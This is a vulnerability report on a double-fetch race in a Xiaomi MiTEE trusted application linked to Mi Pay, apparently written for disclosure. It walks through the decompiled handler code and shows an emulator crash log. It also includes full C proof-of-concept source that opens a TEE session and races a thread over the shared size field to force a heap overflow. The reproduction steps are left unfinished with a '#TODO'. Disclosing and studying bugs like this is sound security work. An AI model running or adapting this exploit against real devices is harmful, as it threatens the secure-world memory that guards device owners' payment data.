
We found a bug of TA (UUID: 88ce8e6b-8646-4092-bb78faf5b55ff4df) of MiTEE. It can be either an out-of-bound bug or a heap overflow. The root cause of this bug is double fetches to the memory shared between normal world and TEE environment.

Importantly, this ta is highly connected to Mi Pay.

## Device Information

The build fingerprint of the device is `Redmi/iron_eea_global/iron:14/UP1A.231005.007/V816.0.18.0.UNQEUXM:user/release-keys`

The sha1 of the TA is `c3664eadd490bcb0ede5e9a98f640b86b8119720`


## Detailed Vulnerability Analysis

The vulnerable execution path starts from `TA_InvokeCommandEntryPoint`. It is the main command handler of a Trusted Application and can be invoked when the normal world sends a command to the TA. All the parameters can be easily controlled by attackers in normal world.

```C
// the definition of the method, TA_InvokeCommandEntryPoint
TEE_Result TA_EXPORT TA_InvokeCommandEntryPoint(
    void* sessionContext,
    uint32_t commandID,
    uint32_t paramTypes, // determine the type of params below as either value or memref
    TEE_Param params[4] 
);

// the definition of type TEE_Param
typedef union
{
	struct
	{
		void* buffer; size_t size;
	} memref;
	struct
	{
		uint32_t a;
		uint32_t b;
	} value;
} TEE_Param;
```

Here we construct params[0] as a `TEEC_MEMREF_TEMP_INPUT` parameter, and set `params[0].memref.buffer[1]` (named as `params_1_used_as_cmd_id` in the following code) to `0xf003`.
Also, we initialize the other corresponding value to params to meet the condition at line 13, 16 and 18, e.g., `params[0].memref.size` as `0x100c` and `params[1].memref.size` as `0x1008`, `params[0].memref.buffer[0]` as `1`.

After that, the `0xf003` case in the switch statement is hit, which transfers control to `FUNC_cmd_f003` at line 31, with `params[0].memref.buffer[2]` (named as `params_alias[2]` in the code below) passed as the second argument. In our PoC, we set `params[0].memref.buffer[2]` to 0x400.


```C
1  undefined8
2  TA_InvokeCommandEntryPoint(undefined8 param_1,uint comm_id,uint param_types,undefined8 *params)

3  {
4    uint uVar1;
5    uint uVar2;
6    uint *puVar3;
7    int *params_alias;
8    uint params_1_used_as_cmd_id;
9
10    printf("[%s:%s][%s:%d]==func enter==\n","Mlipay",&DAT_00103d76,"TA_InvokeCommandEntryPoint",0x35);
11    printf("[%s:%s][%s:%d]cmd %08x\n","Mlipay",&DAT_00103d76,"TA_InvokeCommandEntryPoint",0x36,
12           (ulong)comm_id);
13    if (((param_types == 0x65) && (*(int *)(params + 1) == 0x100c)) &&
14       (*(int *)(params + 3) == 0x1008)) {
15      params_alias = (int *)*params;
16      if ((uint)params_alias[2] < 0x1001) {
17        puVar3 = (uint *)params[2];
18        if (*params_alias == 1) {
19          uVar1 = params_alias[1];
20          uVar2 = uVar1 >> 0x1c;
21          params_1_used_as_cmd_id = uVar1 & 0xffff;
22          if ((uVar1 & 0xfffe) != 0x1000) {
23            uVar2 = 1;
24            params_1_used_as_cmd_id = uVar1;
25          }
26          printf("[%s:%s][%s:%d]fp_vendor: %08x, cmd_id: %08x\n","Mlipay",&DAT_00103d76,
27                 "TA_InvokeCommandEntryPoint",0x61,(ulong)uVar2,(ulong)params_1_used_as_cmd_id);
28          switch(params_1_used_as_cmd_id) {
29          // ...
30          case 0xf003: /* bug is here */
31            uVar2 = FUNC_cmd_f003(params_alias + 3,params_alias[2],puVar3 + 2,puVar3 + 1);
32            *puVar3 = uVar2;
33            break;
```

As a result, `sth_root_verify` is triggered inside `FUNC_cmd_f003`, as `param_2` is set to 0x400, which is larger than the check value 0x140.

Keep in mind that the sum of the second and the fourth parameters of `sth_root_verify` equals `param_2`(i.e., 0x400), which originates from `params[0].memref.buffer[2]`.

```C
int FUNC_cmd_f003(long param_1,uint param_2) {
  if (param_2 < 0x140) { // fetch here, need to pass this check at the first place
    iVar1 = 0x7a000003;
    pcVar4 = "[%s:%s][%s:%d]data len is invalid\n";
    uVar5 = 0x4a7;
  }
  else {
    iVar1 = sth_root_verify(param_1,(ulong)(param_2 - 0x40),param_1 + (ulong)(param_2 - 0x40),0x40);
  }
```

In `sth_root_verify`, we can easily observe that the double-fetch case occurs. 
For example, at line 9, the first fetch of `param_2` will be used as the size parameter of `memmove()` at line 29.
However, the memory allocation `memory_alloc` at line 18 takes the value from the second fetch at line 17 as its first parameter, which specifies the size of the needed heap memory. 


So if `params[0].memref.buffer[2]` is left as 0x400, the `param_2` here in `sth_root_verify` becomes 0x3c0 (0x400 - 0x40). 
Recall that the sum of the second and fourth parameters of `sth_root_verify` equals `params[0].memref.buffer[2]`. 
Moreover, `p2_0x18` is computed as `params[0].memref.buffer[2]` + 0x18.
The attacker can then modify `params[0].memref.buffer[2]` to 0xffffffe8 before line 17, causing `p2_0x18` to wrap around to **0x0** (0xffffffe8 + 0x18).

In the end, `allocated_buffer__ptr` becomes a minimally sized heap chunk. Consequently, the previously fetched size used in `memmove()` causes an out-of-bounds read or a heap overflow at line 26-31.


```C
1  ulong sth_root_verify(long param_1,int param_2,long param_3,int param_4)
2  {
3    void *allocated_buffer__ptr;
4    long lVar10;
5    int p2_0x18;
6    /* ... */
7    /* first fetch */
8    *(int *)(lVar10 + -0x78) = param_4;
9    *(int *)(lVar10 + -0x74) = param_2;
10    if (((param_1 == 0) || (param_2 == 0)) || (param_3 == 0)) {
11      pcVar4 = "[%s:%s][%s:%d]invalid parameters\n";
12      uVar5 = 0x23f;
13      uVar7 = 0x7a000003;
14    }
15    else {
16      // ...
17      p2_0x18 = param_2 + param_4 + 0x18; /* second fetch */
18      allocated_buffer__ptr = (void *)memory_alloc(p2_0x18,0); // param_2 used for allocation
19      if (allocated_buffer__ptr == (void *)0x0) {
20        p2_0x18 = printf("[%s:%s][%s:%d]malloc buf fail\n","Mlipay","ERROR","root_verify",0x250);
21        uVar7 = 0x7a000006;
22        goto LAB_0012f15c;
23      }
24      // ...
25      /* crash, first fetch used for memmove */
26      memmove(allocated_buffer__ptr,lVar10 + -0x68,0x10);   
27      memmove((long)allocated_buffer__ptr + 0x10,lVar10 + -0x74,4);
28      lVar1 = (long)allocated_buffer__ptr + 0x14;
29      memmove(lVar1,param_1,*(undefined4 *)(lVar10 + -0x74));
30      memmove(lVar1 + (ulong)*(uint *)(lVar10 + -0x74),lVar10 + -0x78,4);
31      memmove(lVar1 + (ulong)*(uint *)(lVar10 + -0x74) + 4,param_3,*(undefined4 *)(lVar10 + -0x78));
```

To sum up, in the race window between the two fetches, the attacker can make the allocation size and the copy size diverge, ultimately leading to out-of-bounds reads and heap overflows.



## Screenshots for Validity



```C
[=]     printf: [Mlipay:INFO][TA_CreateEntryPoint:15]==func enter==
[=]     printf: [Mlipay:INFO][TA_CreateEntryPoint:21]==func exit==
[=]     printf: [Mlipay:INFO][TA_OpenSessionEntryPoint:30]==func enter==
[=]     printf: [Mlipay:INFO][TA_OpenSessionEntryPoint:31]==func exit==
[=]     [TA_InvokeCommandEntryPoint] start @0x555555578ae8
[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:54]cmd 0000f003
[=]     printf: [Mlipay:INFO][TA_InvokeCommandEntryPoint:97]fp_vendor: 00000001, cmd_id: 0000f003
[=]     TEE_Malloc: allocated 0x0 at 0xaaaaa020
[=]     memmove 0x10 from 0xf0fe58 to 0xaaaaa020
[x]     =================[lr: 0x5555555831c0] [memmove] out-of-bound write on address 0xaaaaa020, size 0x10!!
[x]     CPU Context:
[x]     x0      : 0xaaaaa020
[x]     x1      : 0xf0fe58
[x]     x2      : 0x10
[x]     x3      : 0x40
[x]     x4      : 0x61
[x]     x5      : 0x1
[x]     x6      : 0xf003
[x]     x7      : 0x400
[x]     x8      : 0xf0fe78
[x]     x9      : 0x211
[x]     x10     : 0x555555578d30
[x]     x11     : 0x27
[x]     x12     : 0x0
[x]     x13     : 0x0
[x]     x14     : 0x0
[x]     x15     : 0x0
[x]     x16     : 0x5555555cd560
[x]     x17     : 0x99999088
[x]     x18     : 0x0
[x]     x19     : 0xaaaaa020
[x]     x20     : 0xf0ffe8
[x]     x21     : 0x1bbbbdfb4
[x]     x22     : 0x0
[x]     x23     : 0xbbbbe00c
[x]     x24     : 0xf0fe58
[x]     x25     : 0xeee008
[x]     x26     : 0xf0fec0
[x]     x27     : 0xf0fe40
[x]     x28     : 0xf0feb8
[x]     x29     : 0x8000002ddd40
[x]     x30     : 0x5555555831c0
[x]     sp      : 0x8000002ddce0
[x]     pc      : 0xdeadbeef
[x]     lr      : 0x5555555831c0
...
[x]     PC = 0x00000000deadbeef (unreachable)

[x]     Memory map:
[x]     Start            End              Perm    Label                                    Image
[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls            
[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack   
[x]     00000099999000 - 0000009999a000   rwx     dl_resolve               
[x]     000000aaaaa000 - 000000aaaab000   rw-     malloc_chunk             
[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id               
[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context          
[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params               
[x]     000000bbbbe000 - 000000bbbc0000   rw-     shared_memory_0          
[x]     000000bbbc0000 - 000000bbbc2000   rw-     shared_memory_1          
[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]               
[x]     00555555554000 - 00555555578000   r--     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
[x]     00555555578000 - 005555555ca000   r-x     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
[x]     005555555ca000 - 005555555d9000   rw-     88ce8e6b-8646-4092-bb78faf5b55ff4df.ta   /srv/emulator/rootfs/88ce8e6b-8646-4092-bb78faf5b55ff4df.ta
[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffffffde000 - 008000002de000   rwx     [stack]                  
Traceback (most recent call last):
  File "/srv/emulator/emulate/__main__.py", line 337, in launch_emu
    emu.start(
  File "/srv/emulator/emulate/ta_mgr.py", line 322, in start
    self.start_interactive()
  File "/srv/emulator/emulate/ta_mgr.py", line 790, in start_interactive
    ret = self.InvokeCommand(sid, cmd, ptypes, command_params)
  File "/srv/emulator/emulate/ta_mgr.py", line 556, in InvokeCommand
    self.ql.run(begin=self.TA_InvokeCommandEntryPoint_start)
  File "/usr/local/lib/python3.10/dist-packages/qiling/core.py", line 588, in run
    self.os.run()
  File "/usr/local/lib/python3.10/dist-packages/qiling/os/linux/linux.py", line 184, in run
    self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count)
  File "/usr/local/lib/python3.10/dist-packages/qiling/core.py", line 768, in emu_start
    self.uc.emu_start(begin, end, timeout, count)
  File "/usr/local/lib/python3.10/dist-packages/unicorn/unicorn_py3/unicorn.py", line 768, in emu_start
    raise UcError(status)
unicorn.unicorn_py3.unicorn.UcError: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)
[+] Error occurred: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)
```



### Source code of the POC

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "tee_client_api.h"
#include "repro.h"
#include "tee.h"
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>  

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
typedef TEEC_Result (*teec_pre_process_operation_impl_t)(TEEC_Context* ctx,
            TEEC_Operation* operation,
            struct tee_ioctl_param* params,
            TEEC_SharedMemory* shms);

void cleanup_shm(){
#if EMULATE
        system("ipcrm -M 0x13337");
        system("ipcrm -M 0x13338");
        system("ipcrm -M 0x13339");
        system("ipcrm -M 0x1333a");
#endif
}

#define teec_pre_process_operation_offset 0x2434

uintptr_t get_lib_base(const char *libname) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("fopen");
        return 0;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, libname)) {
            uintptr_t base = 0;
            // The address range looks like "7f9a2c0000-7f9a2e0000 ..."
            if (sscanf(line, "%lx-%*lx", &base) == 1) {
                fclose(fp);
                return base;
            }
        }
    }

    fclose(fp);
    return 0;
}

#define CMD 0xf003

typedef struct composed_data{
    int mustbeone;
    int cmd;
    int size;
} composed_data;

void* mod_thread(void* arg){
    composed_data* wow = (composed_data*)arg;
    while(1){
        wow->size = 0x400;
        wow->size = 0xffffffe8; 
    }
}

void setup_mem(composed_data* m1, composed_data* m2){
    m1->mustbeone = 1;
    m1->cmd = 0xf003;
    m1->size = 0x400;
    m2->mustbeone = 1;
    m2->cmd = 0xf003;
    m2->size = 0x400;
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    pthread_t tid;
    void* mem_area1 = allocate_param_mem(context, 0x2000);
    void* mem_area2 = allocate_param_mem(context, 0x2000);
    
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[0].tmpref.buffer = mem_area1; 
    op.params[0].tmpref.size = 0x100c; 
    op.params[1].tmpref.buffer = mem_area2;
    op.params[1].tmpref.size = 0x1008; 
    setup_mem(mem_area1, mem_area2);  
   
    #define TEEC_CONFIG_PAYLOAD_REF_COUNT 4
    uint64_t buf[(sizeof(struct tee_ioctl_invoke_arg) +
            TEEC_CONFIG_PAYLOAD_REF_COUNT *
                sizeof(struct tee_ioctl_param)) /
            sizeof(uint64_t)] = { 0 };
    struct tee_ioctl_buf_data buf_data;
    struct tee_ioctl_invoke_arg *arg;
    struct tee_ioctl_param *params;
    TEEC_Result res;
    uint32_t eorig;
    TEEC_SharedMemory shm[TEEC_CONFIG_PAYLOAD_REF_COUNT];
    int rc;
    buf_data.buf_ptr = (uintptr_t)buf;
    buf_data.buf_len = sizeof(buf);

    arg = (struct tee_ioctl_invoke_arg *)buf;
    arg->num_params = TEEC_CONFIG_PAYLOAD_REF_COUNT;
    params = (struct tee_ioctl_param *)(arg + 1);

    arg->session = session->session_id;
    arg->func = CMD;
    
    op.session = session;
   
	teec_pre_process_operation_impl_t teec_pre_process_operation_impl =
        (teec_pre_process_operation_impl_t)((uint8_t*)get_lib_base("libteecli.so") + teec_pre_process_operation_offset);			
 
    res = teec_pre_process_operation_impl(session->ctx, &op, params, shm);
    if (res != TEEC_SUCCESS) {
        printf("teec_pre_process_operation failed!! %x\n", res);
        exit(-1);
    }

	mem_area1 = shm[0].buffer;
    setup_mem(mem_area1, mem_area2);  
    if (pthread_create(&tid, NULL, mod_thread, mem_area1) != 0) {
        perror("pthread_create failed");
        return;
    }

    rc = ioctl(session->ctx->fd, TEE_IOC_INVOKE, &buf_data);
    res = arg->ret;
    err_origin = arg->ret_origin; 
    printf("outbuf %x TEEC_Result: %x origin: err_origin: %x\n", *(int*)shm[1].buffer, res, err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "88ce8e6b-8646-4092-bb78faf5b55ff4df";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}

```

For reference, the dependent files for the PoC are attached here.
- `tee_client_api.h`: Open-sourced in the OPTEE repo
- `tee.h`: Open-sourced in the OPTEE repo
- `repro.h`: Contains basic utilities specific to this PoC, primarily handling parameter initialization, TEE Client API invocation, and character-related operations.
- `libteecli.so`: Can be found at the device path ./vendor/lib64/libteecli.so.



### Vulnerability Reproduction

1. preacquisition
2. interaction
3. clip

#TODO